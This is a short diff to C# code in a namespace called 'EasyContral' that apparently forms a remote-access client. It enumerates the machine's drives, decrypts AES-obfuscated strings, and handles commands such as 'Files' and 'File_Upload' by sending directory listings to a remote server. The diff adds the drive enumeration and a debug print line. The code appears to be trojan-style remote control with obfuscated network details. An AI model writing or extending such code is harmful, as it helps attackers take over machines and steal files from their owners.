@@ -35,7 +35,10 @@ namespace EasyContral
                 return;
             }
             string Drive = "";
-
+            foreach (string dirve in DriveInfo)
+            {
+                Drive += dirve + "|";
+            }
             HttpClient client = new HttpClient();
             string a = AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV);
             string b = AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV);
@@ -99,6 +102,7 @@ namespace EasyContral
                         case "Files":
                             string files = FileContral.GetFileList(Command);
                             //SendToServer(result, files, "FilesResult");
+                            Console.WriteLine("yyyy");
                             SendToServer(result, files, AESDecrypt("ZxFxSeeIg6vzRpV18NdzyQ==", Key, IV));
                             break;
                         case "File_Upload":
